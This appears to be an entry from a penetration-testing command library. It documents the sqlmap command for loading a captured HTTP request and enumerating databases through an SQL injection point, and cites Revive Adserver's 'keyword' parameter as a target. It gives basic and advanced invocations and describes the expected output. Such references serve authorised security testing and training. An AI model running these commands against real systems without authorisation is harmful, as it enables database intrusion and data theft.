---
data: sqlmap -r testsql.txt --dbs
tags:
  - sqli
  - database-enum
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.233Z'
id: aa5eb5bd-d247-4eb3-b2e0-eb45c6e29e8d
verified: false
validated: true
submitted: true
---
# sqlmap-enumerate-databases-via-http-request

## Command

```bash
sqlmap -r testsql.txt --dbs
```

## Description

This command uses SQLMap to load a captured HTTP request file and enumerate all accessible databases via an SQL injection point, ideal for exploiting web vulnerabilities like the one in Revive Adserver's 'keyword' parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-r` | Load HTTP request from the specified file (e.g., testsql.txt) | Yes |
| `--dbs` | Enumerate DBMS databases | Yes |

## Examples

### Basic Usage

```bash
sqlmap -r testsql.txt --dbs
```

### Advanced Usage

```bash
sqlmap -r testsql.txt --dbs --batch --level=3
```

## Expected Output

SQLMap will output injection technique (e.g., error-based MySQL), available databases like ['information_schema', 'revive_adserver'], and confirm successful exploitation.

## Related

- [[Related Procedure|procedures/Exploit-SQL-Injection-with-SQLMap]]
